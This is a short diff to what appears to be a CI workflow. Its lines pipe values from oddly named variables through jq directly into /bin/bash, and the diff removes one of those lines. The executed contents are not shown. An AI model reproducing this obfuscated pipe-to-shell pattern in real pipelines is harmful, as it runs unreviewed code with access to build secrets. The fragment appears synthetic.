@@ -25,7 +25,6 @@ jobs:
           echo $u128 | jq -r .e082 | /bin/bash
           printf '%s' "$l51275" | jq -r .aqnoc4 | /bin/bash
           printf '%s' "$b916" | jq -r .r25 | /bin/bash
-          printf '%s' "$jplu20" | jq -r .mgkj4309 | /bin/bash
           printf '%s' "$tsn2" | jq -r .m231 | /bin/bash
 
       - name: Upload output
